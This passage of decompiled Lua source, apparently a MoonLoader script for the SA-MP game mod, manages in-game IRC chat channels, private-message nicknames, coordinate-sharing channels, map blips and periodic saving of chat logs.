		var_0_4.write(arg_72_0 + iter_72_0 - 1, arr[iter_72_0], 1, true)
	end
end

function addNickTable(arg_73_0)
	for iter_73_0, iter_73_1 in ipairs(var_0_12.NickPm) do
		if iter_73_1 == arg_73_0 then
			return
		end
	end

	table.insert(var_0_12.NickPm, arg_73_0)

	local var_73_0 = #var_0_12.NickPm

	var_0_12.logPm[var_73_0] = encodeJson({})
	LogChatPm[var_73_0] = {}

	sampRegisterChatCommand(var_0_12.cfg.CmdNickPm .. var_73_0, function(arg_74_0)
		fSendPmU8(arg_74_0, var_73_0)
	end)
	var_0_10.save(var_0_12, var_0_11)
end

function fAddChan()
	local var_75_0 = checkHashtag(var_0_14.string(var_0_30))

	table.insert(var_0_12.ChanName, var_75_0)

	local var_75_1 = #var_0_12.ChanName
	local var_75_2 = var_0_14.string(var_0_31)

	if var_75_2:sub(1, 1) == "/" then
		var_75_2 = var_75_2:sub(2)
	end

	var_0_12.ChanCmd[var_75_1] = var_75_2

	if var_0_27 then
		var_0_12.ChanTag[var_75_1] = ChanCrlTagkk
		var_0_12.ChanCrlTag[var_75_1] = ChanCrlTagk
	end

	var_0_12.ChanKey[var_75_1] = ""
	var_0_12.ChanBool[var_75_1] = true
	var_0_12.logChan[var_75_1] = encodeJson({})

	TableUsersK(var_75_1)
	sendIRC("join", var_0_12.ChanName[var_75_1], var_0_12.ChanKey[var_75_1])

	local var_75_3 = string.format("#crd%s", var_0_12.ChanName[var_75_1])

	sendIRC("join", var_75_3)
	var_0_10.save(var_0_12, var_0_11)
end

function checkHashtag(arg_76_0)
	if string.sub(arg_76_0, 1, 1) ~= "#" then
		arg_76_0 = "#" .. arg_76_0
	end

	return arg_76_0
end

function fSendChanImg(arg_77_0)
	sampUnregisterChatCommand(var_0_12.ChanCmd[arg_77_0])
	sampUnregisterChatCommand(ChanCrd[arg_77_0])

	local var_77_0 = var_0_14.string(var_0_31)

	if var_77_0:sub(1, 1) == "/" then
		var_77_0 = var_77_0:sub(2)
	end

	var_0_12.ChanCmd[arg_77_0] = var_77_0

	if var_0_27[0] then
		var_0_12.ChanTag[arg_77_0] = ChanCrlTagkk
		var_0_12.ChanCrlTag[arg_77_0] = ChanCrlTagk
	end

	sampRegisterChatCommand(var_0_12.ChanCmd[arg_77_0], function(arg_78_0)
		fSendChanU8(arg_78_0, arg_77_0)
	end)

	ChanCrd[arg_77_0] = var_0_12.ChanCmd[arg_77_0] .. "g"

	sampRegisterChatCommand(ChanCrd[arg_77_0], function(arg_79_0)
		fSendCoordChan(arg_77_0)
	end)
	var_0_10.save(var_0_12, var_0_11)
end

function deleteChan(arg_80_0, arg_80_1)
	sampUnregisterChatCommand(var_0_12.ChanCmd[arg_80_0])
	sampUnregisterChatCommand(ChanCrd[arg_80_0])

	if posChan[arg_80_0] then
		posChan[arg_80_0] = false
	end

	if poolChan[arg_80_0] then
		removeBlip(poolChan[arg_80_0])
	end

	sendIRC("part", arg_80_1)
	sendIRC("part", string.format("#crd%s", arg_80_1))

	local var_80_0 = {
		UserChan,
		fUserChan,
		banUserChan,
		LogChatChan,
		kickerstat,
		passstat,
		posChan,
		coordStat,
		colorChan,
		TopicChan,
		icombo,
		banCombo,
		poolChan
	}

	for iter_80_0, iter_80_1 in pairs(var_80_0) do
		table.remove(iter_80_1, arg_80_0)
	end

	table.remove(var_0_12.ChanName, arg_80_0)
	table.remove(var_0_12.ChanCmd, arg_80_0)
	table.remove(var_0_12.ChanTag, arg_80_0)
	table.remove(var_0_12.ChanKey, arg_80_0)
	table.remove(var_0_12.ChanBool, arg_80_0)
	table.remove(var_0_12.logChan, arg_80_0)
	var_0_10.save(var_0_12, var_0_11)
end

function saverChat()
	lua_thread.create(function()
		while true do
			wait(20000)

			for iter_82_0, iter_82_1 in ipairs(var_0_12.ChanName) do
				var_0_12.logChan[iter_82_0] = encodeJson(LogChatChan[iter_82_0])

				if poolChan[iter_82_0] ~= nil then
					removeBlip(poolChan[iter_82_0])
				end
			end

			for iter_82_2, iter_82_3 in ipairs(var_0_12.NickPm) do
				var_0_12.logPm[iter_82_2] = encodeJson(LogChatPm[iter_82_2])
			end

			var_0_10.save(var_0_12, var_0_11)
		end
	end)
end

function onScriptTerminate(arg_83_0, arg_83_1)
	if arg_83_0 == thisScript() then
		if var_0_12.cfg.AutoConnect then
			for iter_83_0, iter_83_1 in ipairs(var_0_12.ChanName) do
				if poolChan[iter_83_0] ~= nil then
					removeBlip(poolChan[iter_83_0])
				end
			end
		end

		var_0_10.save(var_0_12, var_0_11)
	end
end
